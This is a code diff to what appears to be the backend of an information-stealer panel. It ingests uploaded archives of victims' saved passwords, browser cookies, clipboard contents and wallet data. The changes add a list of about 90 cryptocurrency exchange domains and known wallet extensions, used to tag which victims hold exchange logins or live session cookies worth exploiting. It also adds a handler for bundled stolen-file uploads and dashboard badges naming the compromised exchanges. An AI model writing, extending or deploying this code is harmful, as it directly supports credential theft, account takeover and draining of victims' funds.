@@ -32,11 +32,15 @@ function archivePath(ctx, clientId, session) {
 function rowToJson(row) {
   let info = null;
   let tags = [];
+  let exchanges = [];
   try {
     info = JSON.parse(row.info_json);
   } catch {}
   try {
     tags = JSON.parse(row.tags || "[]");
+  } catch {}
+  try {
+    exchanges = JSON.parse(row.exchanges || "[]");
   } catch {}
   return {
     id: row.id,
@@ -48,6 +52,7 @@ function rowToJson(row) {
     seen: !!row.seen,
     partial: !!row.partial,
     tags,
+    exchanges,
     info,
   };
 }
@@ -60,10 +65,102 @@ const TAG_DOMAIN_RULES = [
   { tag: "paypal", needles: ["paypal.com", "paypalobjects.com"] },
   // "amazon." but never amazonaws (AWS infra hosts) — that was the false positive.
   { tag: "amazon", needles: ["amazon."], exclude: ["amazonaws."] },
-  {
-    tag: "crypto-exchange",
-    needles: ["binance.", "coinbase.", "kraken.", "bybit.", "okx.", "kucoin.", "crypto.com", "bitstamp.", "gemini.", "bitfinex.", "gate.io", "upbit.", "bitget.", "htx.", "mexc."],
-  },
+];
+
+// Exchange domains → display names. A hit on any needle (saved creds or a live
+// session cookie) both fires the "crypto-exchange" tag and records the exchange
+// name for the xfill table's Exchanges column.
+const EXCHANGE_NEEDLES = [
+  ["binance.", "Binance"],
+  ["coinbase.", "Coinbase"],
+  ["kraken.", "Kraken"],
+  ["bybit.", "Bybit"],
+  ["okx.", "OKX"],
+  ["kucoin.", "KuCoin"],
+  ["crypto.com", "Crypto.com"],
+  ["bitstamp.", "Bitstamp"],
+  ["gemini.", "Gemini"],
+  ["bitfinex.", "Bitfinex"],
+  ["gate.io", "Gate.io"],
+  ["upbit.", "Upbit"],
+  ["bitget.", "Bitget"],
+  ["htx.", "HTX"],
+  ["mexc.", "MEXC"],
+  ["bingx.", "BingX"],
+  ["bitunix.", "Bitunix"],
+  ["coinw.", "CoinW"],
+  ["pionex.", "Pionex"],
+  ["orangex.", "OrangeX"],
+  ["orange-x.", "OrangeX"],
+  ["kcex.", "KCEX"],
+  ["weex.", "WEEX"],
+  ["toobit.", "Toobit"],
+  ["lbank.", "LBank"],
+  ["poloniex.", "Poloniex"],
+  ["bitmart.", "BitMart"],
+  ["ascendex.", "AscendEX"],
+  ["bithumb.", "Bithumb"],
+  ["bitflyer.", "bitFlyer"],
+  ["coincheck.", "Coincheck"],
+  ["deribit.", "Deribit"],
+  ["phemex.", "Phemex"],
+  ["cex.io", "CEX.IO"],
+  ["hitbtc.", "HitBTC"],
+  ["hotbit.", "Hotbit"],
+  ["changelly.", "Changelly"],
+  ["whitebit.", "WhiteBIT"],
+  ["xt.com", "XT.com"],
+  ["deepcoin.", "Deepcoin"],
+  ["blofin.", "BloFin"],
+  ["btse.", "BTSE"],
+  ["latoken.", "Latoken"],
+  ["bitrue.", "Bitrue"],
+  ["bitso.", "Bitso"],
+  ["luno.", "Luno"],
+  ["mercadobitcoin.", "Mercado Bitcoin"],
+  ["novadax.", "NovaDAX"],
+  ["probit.", "ProBit"],
+  ["bitvavo.", "Bitvavo"],
+  ["korbit.", "Korbit"],
+  ["coinex.", "CoinEx"],
+  ["bitbns.", "Bitbns"],
+  ["coindcx.", "CoinDCX"],
+  ["foxbit.", "Foxbit"],
+  ["cointr.", "CoinTR"],
+  ["fameex.", "FameEX"],
+  ["p2pb2b.", "P2PB2B"],
+  ["tokpie.", "Tokpie"],
+  ["zonda.", "Zonda"],
+  ["bitpanda.", "Bitpanda"],
+  ["swyftx.", "Swyftx"],
+  ["coinspot.", "CoinSpot"],
+  ["independentreserve.", "Independent Reserve"],
+  ["btcmarkets.", "BTC Markets"],
+  ["shakepay.", "Shakepay"],
+  ["newton.", "Newton"],
+  ["ndax.", "NDAX"],
+  ["bitbuy.", "Bitbuy"],
+  ["virgocx.", "VirgoCX"],
+  ["wazirx.", "WazirX"],
+  ["zebpay.", "ZebPay"],
+  ["giottus.", "Giottus"],
+  ["bitazza.", "Bitazza"],
+  ["indodax.", "Indodax"],
+  ["tokocrypto.", "Tokocrypto"],
+  ["bitkub.", "Bitkub"],
+  ["satang.", "Satang"],
+  ["coins.ph", "Coins.ph"],
+  ["pdax.", "PDAX"],
+  ["bitmex.", "BitMEX"],
+  ["woox.", "WOO X"],
+  ["hashkey.", "HashKey"],
+  ["backpack.exchange", "Backpack"],
+  ["bullish.", "Bullish"],
+  ["btcbox.", "BTCBOX"],
+  ["coinzoom.", "CoinZoom"],
+  ["exmo.", "EXMO"],
+  ["yobit.", "YoBit"],
+  ["cexplus.", "CEX+"],
 ];
 
 /// Scan an assembled archive for high-value indicators.
@@ -72,6 +169,8 @@ const TAG_DOMAIN_RULES = [
 /// Wallets come from Info.json lists.
 function computeTags(zipBuf, info) {
   const tags = new Set();
+  const exchanges = [];
+  const exchangesSeen = new Set();
   try {
     const zip = parseZip(zipBuf);
     for (const entry of zip.entries) {
@@ -93,27 +192,42 @@ function computeTags(zipBuf, info) {
         for (const rule of TAG_DOMAIN_RULES) {
           if (rule.exclude && rule.exclude.some((x) => host.includes(x))) continue;
           if (!rule.needles.some((n) => host.includes(n))) continue;
-          if (rule.tag === "crypto-exchange") {
-            // Exchanges: saved creds OR a live session cookie both count.
-            tags.add(rule.tag);
-          } else if (isCookies || (isPasswords && row?.Password && String(row.Password).length > 0)) {
+          if (isCookies || (isPasswords && row?.Password && String(row.Password).length > 0)) {
             // PayPal/Amazon: saved login or any cookie for the domain.
             tags.add(rule.tag);
+          }
+        }
+        for (const [needle, name] of EXCHANGE_NEEDLES) {
+          if (!host.includes(needle)) continue;
+          // Exchanges: saved creds OR a live session cookie both count.
+          tags.add("crypto-exchange");
+          if (!exchangesSeen.has(name)) {
+            exchangesSeen.add(name);
+            exchanges.push(name);
           }
         }
       }
     }
   } catch {}
   if (Array.isArray(info?.DesktopWallets) && info.DesktopWallets.length > 0) tags.add("crypto-wallet");
-  // Extensions only count when they mapped to a known wallet/password-manager/
-  // 2FA name — raw 32-char store IDs are unmapped unknowns, not vaults.
+  // Extension vaults only count for actual crypto wallets — 2FA/password-manager
+  // extensions (Authenticator, Bitwarden, etc.) are NOT wallets.
+  const KNOWN_EXT_WALLETS = new Set([
+    "MetaMask", "Phantom", "Coinbase Wallet", "Trust Wallet", "Rabby", "OKX Wallet",
+    "Bybit Wallet", "Binance Wallet", "Crypto.com Onchain", "Bitget Wallet", "Exodus",
+    "Guarda Wallet", "Ctrl Wallet", "Enkrypt", "SafePal", "Solflare", "Backpack",
+    "Zerion", "Keplr", "Leap Wallet", "Cosmostation", "Station Wallet", "Petra",
+    "Martian", "Slush", "Suiet", "TronLink", "Leather", "Rainbow", "Coin98",
+    "Uniswap", "TokenPocket", "MathWallet", "Core", "Ready Wallet", "Braavos",
+    "MyTonWallet", "Ronin Wallet", "BitKeep", "Frontier Wallet",
+  ]);
   if (
     Array.isArray(info?.BrowserExtensions) &&
-    info.BrowserExtensions.some((e) => typeof e === "string" && !/^[a-z]{32}$/.test(e))
+    info.BrowserExtensions.some((e) => typeof e === "string" && KNOWN_EXT_WALLETS.has(e))
   ) {
     tags.add("crypto-wallet");
   }
-  return [...tags];
+  return { tags: [...tags], exchanges };
 }
 
 /* ──────────────────────────────────────────────
@@ -169,12 +283,12 @@ async function storeSessionArchive(ctx, clientId, session, payload, partial) {
       .get(String(clientId));
     info.FirstTime = (prior?.n ?? 0) === 0;
   }
-  const tags = computeTags(zip, info);
+  const { tags, exchanges } = computeTags(zip, info);
   const createdAt = new Date().toISOString();
   const filename = `${session}.zip`;
   const result = ctx.db
-    .prepare("INSERT INTO archives(client_id, session, filename, size, created_at, info_json, tags, partial) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
-    .run(String(clientId), session, filename, zip.length, createdAt, JSON.stringify(info), JSON.stringify(tags), partial ? 1 : 0);
+    .prepare("INSERT INTO archives(client_id, session, filename, size, created_at, info_json, tags, exchanges, partial) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)")
+    .run(String(clientId), session, filename, zip.length, createdAt, JSON.stringify(info), JSON.stringify(tags), JSON.stringify(exchanges), partial ? 1 : 0);
 
   const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(result.lastInsertRowid);
   ctx.broadcast("archive_added", rowToJson(row));
@@ -333,12 +447,12 @@ async function finalizeSession(ctx, clientId, session) {
       .get(String(clientId));
     if (info && typeof info === "object") info.FirstTime = (prior?.n ?? 0) === 0;
 
-    const tags = computeTags(zip, info);
+    const { tags, exchanges } = computeTags(zip, info);
     const createdAt = new Date().toISOString();
     const filename = `${session}.zip`;
     const result = ctx.db
-      .prepare("INSERT INTO archives(client_id, session, filename, size, created_at, info_json, tags) VALUES (?, ?, ?, ?, ?, ?, ?)")
-      .run(String(clientId), session, filename, zip.length, createdAt, JSON.stringify(info), JSON.stringify(tags));
+      .prepare("INSERT INTO archives(client_id, session, filename, size, created_at, info_json, tags, exchanges) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
+      .run(String(clientId), session, filename, zip.length, createdAt, JSON.stringify(info), JSON.stringify(tags), JSON.stringify(exchanges));
 
     const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(result.lastInsertRowid);
     ctx.broadcast("archive_added", rowToJson(row));
@@ -666,6 +780,7 @@ export default {
         info_json TEXT,
         seen INTEGER DEFAULT 0,
         tags TEXT DEFAULT '[]',
+        exchanges TEXT DEFAULT '[]',
         partial INTEGER DEFAULT 0
       );
       CREATE INDEX IF NOT EXISTS archives_created ON archives(created_at DESC);
@@ -682,6 +797,9 @@ export default {
       ctx.db.exec("ALTER TABLE archives ADD COLUMN tags TEXT DEFAULT '[]'");
     } catch {}
     try {
+      ctx.db.exec("ALTER TABLE archives ADD COLUMN exchanges TEXT DEFAULT '[]'");
+    } catch {}
+    try {
       ctx.db.exec("ALTER TABLE archives ADD COLUMN partial INTEGER DEFAULT 0");
     } catch {}
     fs.mkdirSync(ctx.dataDir, { recursive: true });
@@ -693,6 +811,31 @@ export default {
   },
 
   onEvent(ctx, clientId, event, payload) {
+    if (event === "xfill_files") {
+      // Bundled small files: each entry is complete (no chunking).
+      const session = Number(payload?.session);
+      const files = payload?.files;
+      if (!Number.isFinite(session) || !Array.isArray(files)) {
+        ctx.log.warn(`xfill_files: malformed payload from ${clientId}`);
+        return;
+      }
+      const key = bufferKey(clientId, session);
+      let buf = pending.get(key);
+      if (!buf) {
+        buf = { isFileMode: true, files: new Map(), inflight: 0, filesDone: 0, startedAt: Date.now(), complete: null, attempts: 0, finalized: false };
+        pending.set(key, buf);
+      }
+      for (const f of files) {
+        const relPath = sanitizeZipPath(f?.path);
+        if (!relPath || typeof f?.data !== "string") continue;
+        const dest = path.join(partDir(ctx, clientId, session), relPath);
+        fs.mkdirSync(path.dirname(dest), { recursive: true });
+        fs.writeFileSync(dest, Buffer.from(f.data, "base64"));
+        buf.filesDone++;
+      }
+      return;
+    }
+
     if (event === "xfill_file") {
       handleFileChunk(ctx, clientId, payload);
       return;
@@ -802,13 +945,17 @@ export default {
       const clientIds = Array.isArray(params?.clientIds) ? params.clientIds : [];
       const contributions = [];
       const stmt = ctx.db.prepare(
-        "SELECT tags FROM archives WHERE client_id = ? ORDER BY id DESC LIMIT 1"
+        "SELECT tags, exchanges FROM archives WHERE client_id = ? ORDER BY id DESC LIMIT 1"
       );
       for (const clientId of clientIds) {
         const row = stmt.get(String(clientId));
         let tags = [];
+        let exchanges = [];
         try {
           tags = JSON.parse(row?.tags || "[]");
+        } catch {}
+        try {
+          exchanges = JSON.parse(row?.exchanges || "[]");
         } catch {}
         if (!Array.isArray(tags) || tags.length === 0) continue;
         const badges = [];
@@ -817,7 +964,14 @@ export default {
         if (tags.includes("amazon"))
           badges.push({ id: "xfill-amazon", label: "Amazon", title: "Amazon credentials/cookies in xfill log", icon: "fa-brands fa-amazon", tone: "warn", priority: 95 });
         if (tags.includes("crypto-exchange"))
-          badges.push({ id: "xfill-exchange", label: "Exchange", title: "Crypto exchange credentials/cookies in xfill log", icon: "fa-solid fa-arrow-trend-up", tone: "good", priority: 94 });
+          badges.push({
+            id: "xfill-exchange",
+            label: "Exchange",
+            title: Array.isArray(exchanges) && exchanges.length > 0
+              ? `Exchange credentials/cookies: ${exchanges.join(", ")}`
+              : "Crypto exchange credentials/cookies in xfill log",
+            icon: "fa-solid fa-arrow-trend-up", tone: "good", priority: 94,
+          });
         if (tags.includes("crypto-wallet"))
           badges.push({ id: "xfill-wallet", label: "Wallet", title: "Crypto wallet data in xfill log", icon: "fa-solid fa-wallet", tone: "good", priority: 93 });
         contributions.push({ clientId, badges });
@@ -860,7 +1014,15 @@ export default {
 
     list(ctx) {
       const rows = ctx.db.prepare("SELECT * FROM archives ORDER BY id DESC").all();
-      return rows.map(rowToJson);
+      // Trim the table payload: Clipboard text can be MBs per row and the
+      // table never displays it (the viewer fetches it on demand).
+      return rows.map((row) => {
+        const json = rowToJson(row);
+        if (json.info && typeof json.info.Clipboard === "string" && json.info.Clipboard.length > 200) {
+          json.info = { ...json.info, Clipboard: json.info.Clipboard.slice(0, 200) + "…" };
+        }
+        return json;
+      });
     },
 
     remove(ctx, params) {
@@ -914,7 +1076,7 @@ export default {
     },
 
     /// Recompute tags for every stored archive (backfills badges for logs
-    /// ingested before tagging existed).
+    /// ingested before tagging existed). Also backfills the exchanges column.
     rescanTags(ctx) {
       const rows = ctx.db.prepare("SELECT * FROM archives").all();
       let updated = 0;
@@ -925,8 +1087,8 @@ export default {
           try {
             info = JSON.parse(row.info_json);
           } catch {}
-          const tags = computeTags(zip.buf, info);
-          ctx.db.prepare("UPDATE archives SET tags = ? WHERE id = ?").run(JSON.stringify(tags), row.id);
+          const { tags, exchanges } = computeTags(zip.buf, info);
+          ctx.db.prepare("UPDATE archives SET tags = ?, exchanges = ? WHERE id = ?").run(JSON.stringify(tags), JSON.stringify(exchanges), row.id);
           updated++;
         } catch {}
       }
